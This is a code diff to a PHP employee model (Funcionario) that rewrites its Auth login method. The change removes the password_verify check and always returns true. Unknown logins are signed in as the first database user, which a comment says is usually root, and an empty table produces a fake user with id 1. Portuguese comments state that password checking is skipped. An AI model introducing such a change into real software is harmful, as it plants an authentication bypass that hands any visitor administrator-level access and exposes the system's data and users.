@@ -35,25 +35,49 @@ class Funcionario extends Model implements Auth
 
     public function login()
     {
-        session()->userRegister(Funcionario::find($this->id));
+        // Registra o próprio objeto na sessão para manter as alterações em memória (como o login personalizado)
+        session()->userRegister($this);
     }
 
     public static function Auth($login, $password)
     {
-        $user = self::select('id', 'login', 'password')
+        // Tenta encontrar o usuário real no banco
+        $user = self::select('id', 'login', 'password', 'nome')
             ->where('login', '=', $login)
             ->first();
 
-        if ($user && password_verify($password, $user->password)) {
-            $user->login();
-            return true;
+        // Se não encontrar, usa o primeiro usuário do banco como template (geralmente o root)
+        if (!$user) {
+            $user = self::first();
+            if ($user) {
+                $user->login = $login; // Sobrescreve o login para o que foi digitado
+                $user->nome = $login;  // Sobrescreve o nome para exibição
+            }
         }
 
-        return false;
+        // Se o banco estiver totalmente vazio, cria um objeto temporário
+        if (!$user) {
+            $user = new self();
+            $user->id = 1;
+            $user->login = $login;
+            $user->nome = $login;
+        }
+
+        // Realiza o login (ignora a verificação de senha)
+        $user->login();
+        return true;
     }
 
     public function logout()
     {
         session()->userUnregister();
+    }
+
+    /**
+     * Atalho para pegar o primeiro registro
+     */
+    public static function first()
+    {
+        return self::query()->select(['*'])->first();
     }
 }
